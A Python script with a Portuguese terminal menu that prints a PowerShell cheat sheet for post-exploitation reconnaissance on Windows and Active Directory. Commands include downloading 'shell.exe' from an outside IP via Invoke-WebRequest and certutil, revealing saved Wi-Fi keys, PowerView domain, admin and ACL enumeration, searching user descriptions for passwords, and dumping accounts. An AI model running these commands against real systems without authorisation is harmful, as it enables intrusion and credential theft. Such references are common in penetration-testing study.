# BIBLIOTESCAS
# =============================
from os import system
from time import sleep
# =============================
#
#
# Funçao Power Shell


def fun_power_shell():
    while True:
        system('clear') or None
        print("""
    ╔═╗╔═╗╔╦╗╔═╗╔╗╔╔╦╗╔═╗╔═╗  ╦ ╦╔╦╗╔═╗╦╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╦ ╦╔═╗╦═╗╔═╗╦ ╦╔═╗╦  ╦  
    ║  ║ ║║║║╠═╣║║║ ║║║ ║╚═╗  ║ ║ ║ ║╣ ║╚═╗   ║║║ ║  ╠═╝║ ║║║║║╣ ╠╦╝╚═╗╠═╣║╣ ║  ║  
    ╚═╝╚═╝╩ ╩╩ ╩╝╚╝═╩╝╚═╝╚═╝  ╚═╝ ╩ ╚═╝╩╚═╝  ═╩╝╚═╝  ╩  ╚═╝╚╩╝╚═╝╩╚═╚═╝╩ ╩╚═╝╩═╝╩═╝\n
    - Lista De Comandos Úteis Do Powershell\n
    [01] - Enumeração do sistema
    [02] - HTTP download (wget like)
    [03] - WLAN enumeration
    [04] - Active Directory enumeration
    [05] - GPO enumeration
    [06] - Password enumeration
    [07] - Computer enumeration
    [08] - Admin groups and account enumeration
    [09] - ACL enumeration
    [10] - Local reconnaissance
    [11] - Menu
    [99] - Sair
            """)
        cmd = str(input("===> "))

        if cmd == '1':
            system('clear') or None
            print("""
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╦╔═╗╔╦╗╔═╗╔╦╗╔═╗
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║ ║  ╚═╗║╚═╗ ║ ║╣ ║║║╠═╣
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ╚═╝╩╚═╝ ╩ ╚═╝╩ ╩╩ ╩\n
    - System enumeration
    > systeminfo
    > Get-WmiObject Win32_ComputerSystem
    > echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"

    - List Security patches

    > Get-Hotfix - description "Security update"
    > wmic qfe get HotfixID, ServicePackInEffect, InstallDate, > InstalledBy, InstalledOn

    - Environment Variables

    > Get-ChildItem Env: | ft Key, Value

    - (over cmd.exe)

    > set
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '2':
            system('clear') or None
            print("""

    ╦ ╦╔╦╗╔╦╗╔═╗  ╔╦╗╔═╗╦ ╦╔╗╔╦  ╔═╗╔═╗╔╦╗
    ╠═╣ ║  ║ ╠═╝   ║║║ ║║║║║║║║  ║ ║╠═╣ ║║
    ╩ ╩ ╩  ╩ ╩    ═╩╝╚═╝╚╩╝╝╚╝╩═╝╚═╝╩ ╩═╩╝\n

    - HTTP download (wget like)

    > Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe"

    - Cmd compatible

    > certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '3':
            system('clear') or None
            print("""

    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╦ ╦╦  ╔═╗╔╗╔
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║  ║║║║  ╠═╣║║║
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ╚╩╝╩═╝╩ ╩╝╚╝\n

    - WLAN enumeration

    > netsh wlan show profiles
    > netsh wlan show profile name="PROFILE-NAME" key=clear
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '4':
            system('clear') or None
            print("""
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔╦╗╦╦═╗╔═╗╔╦╗╦═╗╦╔═╗  ╔═╗╔╦╗╦╦  ╦╔═╗
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║ ║   ║║║╠╦╝║╣  ║ ╠╦╝║║ ║  ╠═╣ ║ ║╚╗╔╝║ ║
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ═╩╝╩╩╚═╚═╝ ╩ ╩╚═╩╚═╝  ╩ ╩ ╩ ╩ ╚╝ ╚═╝ \n

    - Active Directory enumeration [Require Powerview.ps1]

    https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

    - Domain enumeration

    > Get-NetDomain

    - List Forest Domains

    > Get-NetForestDomain

    - Domain SID

    > Get-DomainSID

    - Domain Policy

    > Get-DomainPolicy

    - Domain Organizational Units

    > Get-NetOU

    - List trusted Domains

    > Get-NetDomainTrust

    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '5':
            system('clear') or None
            print("""

    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔═╗╔═╗╔═╗
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║  ║ ╦╠═╝║ ║
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ╚═╝╩  ╚═╝\n

    - GPO applied to the machine

    > Get-NetGPO -ComputerName computername.domain.com
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '6':
            system('clear') or None
            print("""
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╔╗╔╦ ╦╔═╗
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║╣   ╚═╗║╣ ║║║╠═╣╠═╣
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ╚═╝╚═╝╝╚╝╩ ╩╩ ╩\n

    - Last Password Set date

    > Get-UserProperty –Properties pwdlastset

    - Description of User object

    > Find-UserField -SearchField Description –SearchTerm “pass”
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '7':
            system('clear') or None
            print("""
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╔╦╗╔═╗╦ ╦╔╦╗╔═╗╔╦╗╔═╗╦═╗
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║╣   ║  ║ ║║║║╠═╝║ ║ ║ ╠═╣ ║║║ ║╠╦╝
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ╚═╝╚═╝╩ ╩╩  ╚═╝ ╩ ╩ ╩═╩╝╚═╝╩╚═ \n

    - List Computers of the Domain

    > Get-NetComputer

    - List Pingable Hosts

    > Get-NetComputer -Ping

    - List Windows 7 Ultimate Computers

    > Get-NetComputer –OperatingSystem "Windows 7 Ultimate"
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '8':
            system('clear') or None
            print("""
    ╔═╗╦═╗╦ ╦╔═╗╔═╗╔═╗  ╔═╗╔╦╗╔╦╗╦╔╗╔╦╔═╗╔╦╗╦═╗╔═╗╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔═╗  ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔╦╗╔═╗  ╔═╗╔═╗╔╗╔╔╦╗╔═╗
    ║ ╦╠╦╝║ ║╠═╝║ ║╚═╗  ╠═╣ ║║║║║║║║║║╚═╗ ║ ╠╦╝╠═╣ ║║║ ║╠╦╝║╣ ╚═╗  ║╣   ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║   ║║║╣   ║  ║ ║║║║ ║ ╠═╣
    ╚═╝╩╚═╚═╝╩  ╚═╝╚═╝  ╩ ╩═╩╝╩ ╩╩╝╚╝╩╚═╝ ╩ ╩╚═╩ ╩═╩╝╚═╝╩╚═╚═╝╚═╝  ╚═╝  ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ═╩╝╚═╝  ╚═╝╚═╝╝╚╝ ╩ ╩ ╩\n

    - List Domain Admin members

    > Get-NetGroupMember -GroupName "Domain Admins"

    - List Admin Groups

    > Get-NetGroup *admin*

    - List Local Admins [need Administrative rights]

    > Get-NetLocalGroup –ComputerName PCNAME-001

    - Get groups of user [need Administrative rights]

    > Get-NetGroup –UserName "username"
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '9':
            system('clear') or None
            print(""" 
    ╔═╗╔╗╔╦ ╦╔╦╗╔═╗╦═╗╔═╗╔═╗  ╔═╗╔═╗╦                                                                                    
    ║╣ ║║║║ ║║║║║╣ ╠╦╝╠═╣║ ║  ╠═╣║  ║                                                                                    
    ╚═╝╝╚╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝  ╩ ╩╚═╝╩═╝ \n

    - User ACL

    > Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs

    - GPO modifications rights

    > Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

    - Password reset rights

    > Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
    """)
            input("[*] - Pressione ENTER para voltar...")
            fun_power_shell()
            break

        elif cmd == '10':
            system('clear') or None
            print(""" 
    ╦═╗╔═╗╔═╗╔═╗╔╗╔╦ ╦╔═╗╔═╗╦╔╦╗╔═╗╔╗╔╔╦╗╔═╗  ╦  ╔═╗╔═╗╔═╗╦                                                              
    ╠╦╝║╣ ║  ║ ║║║║╠═╣║╣ ║  ║║║║║╣ ║║║ ║ ║ ║  ║  ║ ║║  ╠═╣║                                                              
    ╩╚═╚═╝╚═╝╚═╝╝╚╝╩ ╩╚═╝╚═╝╩╩ ╩╚═╝╝╚╝ ╩ ╚═╝  ╩═╝╚═╝╚═╝╩ ╩╩═╝\n

    - Export user accounts with ldifde

    > ldifde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.ldf

    - Export user accounts with csvde

    > csvde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.csv
    """)
            input("[*] - Pressione ENTER para voltar...")
        elif cmd == '11':
            break

        elif cmd == '99':
            print("Até logo....")
            exit()

        else:
            print("Comando Inválido!!!")
            sleep(2)


